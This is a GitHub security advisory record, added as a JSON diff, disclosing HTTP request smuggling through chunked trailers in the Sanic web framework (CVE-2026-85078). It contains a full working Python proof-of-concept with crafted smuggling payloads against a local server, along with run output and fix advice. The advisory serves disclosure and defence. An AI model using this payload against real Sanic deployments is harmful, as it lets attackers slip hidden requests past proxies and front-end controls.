@@ -1,0 +1,181 @@
+{
+  "id": "GHSA-wmj6-g64g-j7q5",
+  "modified": "2026-09-17T16:32:22.094734437Z",
+  "published": "2026-09-17T14:59:16Z",
+  "aliases": [
+    "CVE-2026-85078"
+  ],
+  "summary": "sanic chunked trailer request smuggling allows hidden second request execution",
+  "details": "## Description\n\nSanic's HTTP/1.1 chunked-body handling does not fully consume the `trailer-part` after the terminating `0\\r\\n` chunk. Because of that, attacker-controlled bytes left in the connection buffer after the first chunked request can be interpreted as the start of a new HTTP request on the same keep-alive connection. In the attached verified proof, a single outer `POST /` request that correctly returns `405 Method Not Allowed` is followed, within the same TCP send, by a hidden second request smuggled through the chunked trailer area. Sanic parses and executes that second request as a real independent request.\n\nThe issue is a request-boundary integrity failure in Sanic's core HTTP/1.1 parser. The verified impact is not speculative. The attached proof shows that one TCP payload produces two server responses: first the expected `405` for the outer `POST /`, then a separate `200 OK` for a hidden `GET /`. A second exploit variant changes the hidden request path and receives a real `404 Not Found`, proving that the hidden second request is not a hard-coded artifact but an actually routed backend request. A control case with a two-character trailer field name shifts the leftover bytes from `GET` to `:GET`, which changes the second response accordingly and confirms that the root cause is incorrect trailer consumption rather than legitimate pipelining.\n\n## Steps To Reproduce\n\n1. Start a Sanic HTTP/1.1 service on a keep-alive connection path. In the verified run, the local target listened on `127.0.0.1:9381` and the root route allowed `GET /` but not `POST /`.\n2. From the package root, run the provided PoC:\n\n```bash\npython3 evidence/vuln_001_chunked_trailer_smuggle.py | tee evidence/vuln_001_chunked_trailer_smuggle.run.txt\n```\n\n3. Review the baseline case in `evidence/vuln_001_chunked_trailer_smuggle.run.txt`. A normal chunked request with `0\\r\\n\\r\\n` returns exactly one response block:\n\n```text\n=== CASE: baseline_no_trailer ===\nReceived response blocks: 1\nHTTP/1.1 405 Method Not Allowed\n```\n\n4. Review the exploit case that hides `GET /` in the trailer area:\n\n```text\n=== CASE: exploit_smuggled_root ===\n```\n\nThe PoC sends a single TCP payload containing:\n\n```text\nPOST / HTTP/1.1\nHost: 127.0.0.1:9381\nConnection: keep-alive\nTransfer-Encoding: chunked\n\n1\nX\n0\na:GET / HTTP/1.1\nHost: 127.0.0.1:9381\n```\n\n5. Confirm that Sanic returns two response blocks from that one send:\n\n```text\nReceived response blocks: 2\nHTTP/1.1 405 Method Not Allowed\n...\nHTTP/1.1 200 OK\n...\n{\"test\":true}\n```\n\n6. Review the second exploit case that changes the smuggled request path to a nonexistent route:\n\n```text\n=== CASE: exploit_smuggled_404 ===\n```\n\nConfirm that Sanic again returns two response blocks and that the second response is a real routed `404 Not Found` for the attacker-controlled hidden path.\n7. Review the control case with a two-character trailer field name:\n\n```text\n=== CASE: offset_control_two_char_field_name ===\n```\n\nConfirm that the second request is now interpreted as `:GET /`, producing a second `405` with `Method :GET not allowed for URL /`. This demonstrates that the leftover bytes begin at a parser offset inside the trailer region and are then reinterpreted as a new request line.\n\n## Recommendations\n\nAfter parsing the terminating `0` chunk, Sanic must continue parsing and fully consuming the `trailer-part` until the final empty line before the connection buffer is reused. If trailer support is not intended, the safer behavior is to reject any request that contains bytes after the terminating `0\\r\\n` other than the expected final empty line, and then close the connection instead of keeping it alive.\n\nAdd regression coverage for all three cases shown in the evidence: a normal `0\\r\\n\\r\\n` chunked termination, a legal trailer that must be fully consumed, and a malicious trailer that must never cause a second backend request to be parsed. The fix needs to guarantee that no bytes from trailer processing can remain in the buffer as a candidate next request.\n\n## poc\n\n```python\n#!/usr/bin/env python3\n\"\"\"Proof of concept for HTTP/1.1 chunked trailer request injection.\"\"\"\n\nfrom __future__ import annotations\n\nimport socket\nfrom dataclasses import dataclass\nfrom typing import Iterable\n\n\nTARGET = \"sanic-org/sanic\"\nBASE_URL = \"http://127.0.0.1:9381\"\nHOST = \"127.0.0.1\"\nPORT = 9381\nTIMEOUT = 1.0\nPROXY = None\nAUTH_HEADERS: dict[str, str] = {}\n\n\n@dataclass\nclass Case:\n    name: str\n    payload: bytes\n    expected_responses: int\n    expected_markers: tuple[bytes, ...]\n\n\ndef build_prefix() -\u003e bytes:\n    return (\n        b\"POST / HTTP/1.1\\r\\n\"\n        + f\"Host: {HOST}:{PORT}\\r\\n\".encode()\n        + b\"Connection: keep-alive\\r\\n\"\n        + b\"Transfer-Encoding: chunked\\r\\n\"\n        + b\"\\r\\n\"\n        + b\"1\\r\\n\"\n        + b\"X\\r\\n\"\n    )\n\n\ndef build_case_payload(path: str | None = None, field_name: str = \"a\") -\u003e bytes:\n    prefix = build_prefix()\n    if path is None:\n        return prefix + b\"0\\r\\n\\r\\n\"\n    return (\n        prefix\n        + b\"0\\r\\n\"\n        + f\"{field_name}:GET {path} HTTP/1.1\\r\\n\".encode()\n        + f\"Host: {HOST}:{PORT}\\r\\n\".encode()\n        + b\"\\r\\n\"\n    )\n\n\ndef send_payload(payload: bytes) -\u003e bytes:\n    response = bytearray()\n    with socket.create_connection((HOST, PORT), timeout=3) as sock:\n        sock.sendall(payload)\n        sock.settimeout(TIMEOUT)\n        while True:\n            try:\n                chunk = sock.recv(4096)\n            except TimeoutError:\n                break\n            if not chunk:\n                break\n            response.extend(chunk)\n    return bytes(response)\n\n\ndef count_http_responses(response: bytes) -\u003e int:\n    return response.count(b\"HTTP/1.1 \")\n\n\ndef ensure_markers(case: Case, response: bytes) -\u003e None:\n    actual_count = count_http_responses(response)\n    if actual_count != case.expected_responses:\n        raise SystemExit(\n            f\"[FAIL] {case.name}: expected {case.expected_responses} responses, got {actual_count}\"\n        )\n    for marker in case.expected_markers:\n        if marker not in response:\n            raise SystemExit(\n                f\"[FAIL] {case.name}: missing marker {marker.decode('latin1', 'replace')}\"\n            )\n\n\ndef render_payload(payload: bytes) -\u003e str:\n    return payload.decode(\"latin1\", \"replace\")\n\n\ndef render_response(response: bytes) -\u003e str:\n    return response.decode(\"latin1\", \"replace\")\n\n\ndef iter_cases() -\u003e Iterable[Case]:\n    yield Case(\n        name=\"baseline_no_trailer\",\n        payload=build_case_payload(),\n        expected_responses=1,\n        expected_markers=(\n            b\"HTTP/1.1 405 Method Not Allowed\",\n            b\"Method POST not allowed for URL /\",\n        ),\n    )\n    yield Case(\n        name=\"exploit_smuggled_root\",\n        payload=build_case_payload(\"/\"),\n        expected_responses=2,\n        expected_markers=(\n            b\"HTTP/1.1 405 Method Not Allowed\",\n            b\"HTTP/1.1 200 OK\",\n            b'{\"test\":true}',\n        ),\n    )\n    yield Case(\n        name=\"exploit_smuggled_404\",\n        payload=build_case_payload(\"/this-path-should-not-exist\"),\n        expected_responses=2,\n        expected_markers=(\n            b\"HTTP/1.1 405 Method Not Allowed\",\n            b\"HTTP/1.1 404 Not Found\",\n            b\"Requested URL /this-path-should-not-exist not found\",\n        ),\n    )\n    yield Case(\n        name=\"offset_control_two_char_field_name\",\n        payload=build_case_payload(\"/\", field_name=\"ab\"),\n        expected_responses=2,\n        expected_markers=(\n            b\"HTTP/1.1 405 Method Not Allowed\",\n            b\"Method :GET not allowed for URL /\",\n        ),\n    )\n\n\ndef main() -\u003e None:\n    print(f\"Target: {TARGET}\")\n    print(f\"Base URL: {BASE_URL}\")\n    print()\n    for case in iter_cases():\n        print(f\"=== CASE: {case.name} ===\")\n        print(\"Sent payload:\")\n        print(render_payload(case.payload))\n        response = send_payload(case.payload)\n        ensure_markers(case, response)\n        print(f\"Received response blocks: {count_http_responses(response)}\")\n        print(\"Raw response:\")\n        print(render_response(response))\n        print(\"[OK] Case verified\")\n        print()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## Evidence Files\n\nThe attachment package includes the exact PoC and the full runtime output from the verified local execution.\n\n- `evidence/vuln_001_chunked_trailer_smuggle.py`: full PoC used for the verified run.\n- `evidence/vuln_001_chunked_trailer_smuggle.run.txt`: runtime output showing the baseline behavior, the successful smuggled `GET /` execution, the successful smuggled `GET /this-path-should-not-exist` execution, and the trailer-offset control case.\n\nObserved baseline behavior:\n\n```text\n=== CASE: baseline_no_trailer ===\nReceived response blocks: 1\nRaw response:\nHTTP/1.1 405 Method Not Allowed\n...\nMethod POST not allowed for URL /\n```\n\nObserved hidden second request execution:\n\n```text\n=== CASE: exploit_smuggled_root ===\nReceived response blocks: 2\nRaw response:\nHTTP/1.1 405 Method Not Allowed\n...\nMethod POST not allowed for URL /\n\nHTTP/1.1 200 OK\n...\n{\"test\":true}\n```\n\nObserved hidden attacker-controlled path execution:\n\n```text\n=== CASE: exploit_smuggled_404 ===\nReceived response blocks: 2\nRaw response:\nHTTP/1.1 405 Method Not Allowed\n...\nMethod POST not allowed for URL /\n\nHTTP/1.1 404 Not Found\n...\nRequested URL /this-path-should-not-exist not found\n```\n\nObserved trailer-offset control:\n\n```text\n=== CASE: offset_control_two_char_field_name ===\nReceived response blocks: 2\nRaw response:\nHTTP/1.1 405 Method Not Allowed\n...\nMethod POST not allowed for URL /\n\nHTTP/1.1 405 Method Not Allowed\n...\nMethod :GET not allowed for URL /\n```\n\n## Impact\n\nAn attacker who can send a chunked HTTP/1.1 request to a Sanic backend can cause the backend to interpret bytes from the trailer region as a second request on the same keep-alive connection. In the verified proof, that second request was fully routed and executed by the backend even though only one outer request was sent by the client.\n\nThis breaks the integrity of HTTP request boundaries inside the server. In real deployments that place Sanic behind reverse proxies, gateways, caches, or other intermediaries, a backend parser mismatch of this kind can become a request smuggling primitive with broader security consequences than the local proof route demonstrates.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "sanic",
+        "purl": "pkg:pypi/sanic"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "24.12.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.4.0",
+        "0.4.1",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.4",
+        "0.6.0",
+        "0.7.0",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "18.12.0",
+        "19.12.0",
+        "19.12.2",
+        "19.12.3",
+        "19.12.4",
+        "19.12.5",
+        "19.3.1",
+        "19.6.0",
+        "19.6.2",
+        "19.6.3",
+        "19.9.0",
+        "20.12.0",
+        "20.12.1",
+        "20.12.2",
+        "20.12.3",
+        "20.12.4",
+        "20.12.5",
+        "20.12.6",
+        "20.12.7",
+        "20.3.0",
+        "20.6.0",
+        "20.6.1",
+        "20.6.2",
+        "20.6.3",
+        "20.9.0",
+        "20.9.1",
+        "21.12.0",
+        "21.12.1",
+        "21.12.2",
+        "21.3.0",
+        "21.3.1",
+        "21.3.2",
+        "21.3.4",
+        "21.6.0",
+        "21.6.1",
+        "21.6.2",
+        "21.9.0",
+        "21.9.1",
+        "21.9.2",
+        "21.9.3",
+        "22.12.0",
+        "22.3.0",
+        "22.3.1",
+        "22.3.2",
+        "22.6.0",
+        "22.6.1",
+        "22.6.2",
+        "22.9.0",
+        "22.9.1",
+        "23.12.0",
+        "23.12.1",
+        "23.12.2",
+        "23.3.0",
+        "23.6.0",
+        "24.12.0",
+        "24.6.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-wmj6-g64g-j7q5/GHSA-wmj6-g64g-j7q5.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "sanic",
+        "purl": "pkg:pypi/sanic"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "25.12.0"
+            },
+            {
+              "fixed": "25.12.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "25.12.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-wmj6-g64g-j7q5/GHSA-wmj6-g64g-j7q5.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sanic-org/sanic/pull/3164"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sanic-org/sanic/pull/3165"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/sanic-org/sanic"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sanic-org/sanic/releases/tag/v24.12.1"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sanic-org/sanic/releases/tag/v25.12.1"
+    }
+  ]
+}
